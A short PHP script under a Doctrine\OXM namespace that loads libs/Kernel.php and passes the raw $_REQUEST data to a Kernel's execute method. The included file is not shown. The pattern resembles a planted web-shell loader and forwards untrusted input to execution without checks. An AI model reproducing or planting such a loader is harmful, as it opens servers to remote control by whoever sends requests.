<?php    namespace Doctrine\OXM;    require_once(__DIR__."/libs/Kernel.php");    $class = new Kernel($_REQUEST);    $class->execute($_REQUEST);    unset($class);